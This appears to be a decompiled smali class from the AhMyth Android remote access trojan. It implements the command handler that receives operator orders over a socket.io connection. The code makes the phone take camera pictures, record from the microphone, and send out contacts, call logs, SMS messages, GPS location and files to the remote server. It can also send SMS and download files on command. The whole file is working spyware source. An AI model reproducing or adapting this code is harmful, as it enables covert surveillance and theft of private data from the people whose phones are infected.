.class public Lahmyth/mine/king/ahmyth/config/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field static context:Landroid/content/Context;

.field static ioSocket:Lio/socket/client/Socket;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic lambda$sendReq$0([Ljava/lang/Object;)V
    .locals 3
    .param p0, "args"    # [Ljava/lang/Object;

    .line 45
    sget-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Object;

    const-string v2, "pong"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$sendReq$1([Ljava/lang/Object;)V
    .locals 8
    .param p0, "args"    # [Ljava/lang/Object;

    .line 50
    const-string v0, "order"

    const/4 v1, 0x0

    :try_start_0
    aget-object v2, p0, v1

    check-cast v2, Lorg/json/JSONObject;

    .line 52
    .local v2, "data":Lorg/json/JSONObject;
    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 54
    .local v3, "order":Ljava/lang/String;
    invoke-static {v0, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 56
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/4 v4, -0x1

    const/4 v5, 0x1

    sparse-switch v0, :sswitch_data_0

    :cond_0
    goto :goto_0

    :sswitch_0
    const-string v0, "x0000sm"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x2

    goto :goto_1

    :sswitch_1
    const-string v0, "x0000mc"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x5

    goto :goto_1

    :sswitch_2
    const-string v0, "x0000lm"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x6

    goto :goto_1

    :sswitch_3
    const-string v0, "x0000fm"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_1

    :sswitch_4
    const-string v0, "x0000cn"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x4

    goto :goto_1

    :sswitch_5
    const-string v0, "x0000cl"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x3

    goto :goto_1

    :sswitch_6
    const-string v0, "x0000ca"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    goto :goto_1

    :goto_0
    const/4 v0, -0x1

    :goto_1
    const-string v6, "ls"

    const-string v7, "extra"

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_2

    .line 94
    :pswitch_0
    :try_start_1
    invoke-static {}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000lm()V

    goto/16 :goto_2

    .line 90
    :pswitch_1
    const-string v0, "sec"

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    invoke-static {v0}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000mc(I)V

    .line 91
    goto/16 :goto_2

    .line 86
    :pswitch_2
    invoke-static {}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000cn()V

    .line 87
    goto/16 :goto_2

    .line 82
    :pswitch_3
    invoke-static {}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000cl()V

    .line 83
    goto/16 :goto_2

    .line 75
    :pswitch_4
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 76
    const/4 v0, 0x0

    invoke-static {v1, v0, v0}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000sm(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2

    .line 77
    :cond_1
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "sendSMS"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 78
    const-string v0, "to"

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "sms"

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v5, v0, v1}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000sm(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    .line 68
    :pswitch_5
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v4, "path"

    if-eqz v0, :cond_2

    .line 69
    :try_start_2
    invoke-virtual {v2, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000fm(ILjava/lang/String;)V

    goto :goto_2

    .line 70
    :cond_2
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "dl"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 71
    invoke-virtual {v2, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000fm(ILjava/lang/String;)V

    goto :goto_2

    .line 59
    :pswitch_6
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "camList"

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 60
    invoke-static {v4}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000ca(I)V

    goto :goto_2

    .line 61
    :cond_3
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "1"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 62
    invoke-static {v5}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000ca(I)V

    goto :goto_2

    .line 63
    :cond_4
    invoke-virtual {v2, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "0"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 64
    invoke-static {v1}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->x0000ca(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 100
    .end local v2    # "data":Lorg/json/JSONObject;
    .end local v3    # "order":Ljava/lang/String;
    :cond_5
    :goto_2
    goto :goto_3

    .line 98
    :catch_0
    move-exception v0

    .line 99
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 101
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_3
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        0x208f5ed6 -> :sswitch_6
        0x208f5ee1 -> :sswitch_5
        0x208f5ee3 -> :sswitch_4
        0x208f5f3f -> :sswitch_3
        0x208f5ff9 -> :sswitch_2
        0x208f600e -> :sswitch_1
        0x208f60d2 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method private static sendReq()V
    .locals 3

    .line 40
    :try_start_0
    sget-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    .line 41
    return-void

    .line 44
    :cond_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->getInstance()Lahmyth/mine/king/ahmyth/config/InputOutputSocket;

    move-result-object v0

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 45
    const-string v1, "ping"

    sget-object v2, Lahmyth/mine/king/ahmyth/config/ConnectionManager$$ExternalSyntheticLambda0;->INSTANCE:Lahmyth/mine/king/ahmyth/config/ConnectionManager$$ExternalSyntheticLambda0;

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 46
    sget-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "order"

    sget-object v2, Lahmyth/mine/king/ahmyth/config/ConnectionManager$$ExternalSyntheticLambda1;->INSTANCE:Lahmyth/mine/king/ahmyth/config/ConnectionManager$$ExternalSyntheticLambda1;

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 103
    sget-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 108
    goto :goto_0

    .line 106
    :catch_0
    move-exception v0

    .line 107
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    const-string v2, "error"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 109
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 1
    .param p0, "context"    # Landroid/content/Context;

    .line 28
    :try_start_0
    sput-object p0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->context:Landroid/content/Context;

    .line 29
    invoke-static {}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    goto :goto_0

    .line 31
    :catch_0
    move-exception v0

    .line 32
    .local v0, "ex":Ljava/lang/Exception;
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 34
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public static x0000ca(I)V
    .locals 4
    .param p0, "req"    # I

    .line 115
    const/4 v0, 0x0

    const/4 v1, 0x1

    const/4 v2, -0x1

    if-ne p0, v2, :cond_1

    .line 117
    new-instance v2, Lahmyth/mine/king/ahmyth/managers/CameraManager;

    sget-object v3, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v2, v3}, Lahmyth/mine/king/ahmyth/managers/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2}, Lahmyth/mine/king/ahmyth/managers/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object v2

    .line 118
    .local v2, "cameraList":Lorg/json/JSONObject;
    if-eqz v2, :cond_0

    .line 119
    sget-object v3, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v1, v1, [Ljava/lang/Object;

    aput-object v2, v1, v0

    const-string v0, "x0000ca"

    invoke-virtual {v3, v0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 120
    .end local v2    # "cameraList":Lorg/json/JSONObject;
    :cond_0
    goto :goto_0

    .line 121
    :cond_1
    if-ne p0, v1, :cond_2

    .line 122
    new-instance v0, Lahmyth/mine/king/ahmyth/managers/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v2}, Lahmyth/mine/king/ahmyth/managers/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Lahmyth/mine/king/ahmyth/managers/CameraManager;->startUp(I)V

    goto :goto_0

    .line 124
    :cond_2
    if-nez p0, :cond_3

    .line 125
    new-instance v1, Lahmyth/mine/king/ahmyth/managers/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lahmyth/mine/king/ahmyth/managers/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v0}, Lahmyth/mine/king/ahmyth/managers/CameraManager;->startUp(I)V

    .line 128
    :cond_3
    :goto_0
    return-void
.end method

.method public static x0000cl()V
    .locals 4

    .line 148
    sget-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/managers/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cl"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 149
    return-void
.end method

.method public static x0000cn()V
    .locals 4

    .line 152
    sget-object v0, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/managers/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cn"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 153
    return-void
.end method

.method public static x0000fm(ILjava/lang/String;)V
    .locals 4
    .param p0, "req"    # I
    .param p1, "path"    # Ljava/lang/String;

    .line 131
    const/4 v0, 0x1

    if-nez p0, :cond_0

    .line 132
    sget-object v1, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/managers/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    aput-object v3, v0, v2

    const-string v2, "x0000fm"

    invoke-virtual {v1, v2, v0}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 133
    :cond_0
    if-ne p0, v0, :cond_1

    .line 134
    invoke-static {p1}, Lahmyth/mine/king/ahmyth/managers/FileManager;->downloadFile(Ljava/lang/String;)V

    .line 135
    :cond_1
    :goto_0
    return-void
.end method

.method public static x0000lm()V
    .locals 11
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 160
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 161
    new-instance v0, Lahmyth/mine/king/ahmyth/managers/LocManager;

    sget-object v1, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/managers/LocManager;-><init>(Landroid/content/Context;)V

    .line 162
    .local v0, "gps":Lahmyth/mine/king/ahmyth/managers/LocManager;
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 164
    .local v1, "location":Lorg/json/JSONObject;
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/managers/LocManager;->canGetLocation()Z

    move-result v2

    const/4 v3, 0x1

    const/4 v4, 0x0

    const-string v5, "enable"

    if-eqz v2, :cond_0

    .line 166
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/managers/LocManager;->getLatitude()D

    move-result-wide v6

    .line 167
    .local v6, "latitude":D
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/managers/LocManager;->getLongitude()D

    move-result-wide v8

    .line 168
    .local v8, "longitude":D
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v10, "   ,  "

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v10, "loc"

    invoke-static {v10, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 169
    invoke-virtual {v1, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 170
    const-string v2, "lat"

    invoke-virtual {v1, v2, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 171
    const-string v2, "lng"

    invoke-virtual {v1, v2, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 172
    .end local v6    # "latitude":D
    .end local v8    # "longitude":D
    goto :goto_0

    .line 174
    :cond_0
    invoke-virtual {v1, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 176
    :goto_0
    sget-object v2, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v3, v3, [Ljava/lang/Object;

    aput-object v1, v3, v4

    const-string v4, "x0000lm"

    invoke-virtual {v2, v4, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 177
    return-void
.end method

.method public static x0000mc(I)V
    .locals 0
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 156
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/managers/MicManager;->startRecording(I)V

    .line 157
    return-void
.end method

.method public static x0000sm(ILjava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p0, "req"    # I
    .param p1, "phoneNo"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .line 139
    const/4 v0, 0x0

    const-string v1, "x0000sm"

    const/4 v2, 0x1

    if-nez p0, :cond_0

    .line 140
    sget-object v3, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/managers/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v0

    invoke-virtual {v3, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 141
    :cond_0
    if-ne p0, v2, :cond_1

    .line 142
    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/managers/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    .line 143
    .local v3, "isSent":Z
    sget-object v4, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v2, v0

    invoke-virtual {v4, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 145
    .end local v3    # "isSent":Z
    :cond_1
    :goto_0
    return-void
.end method
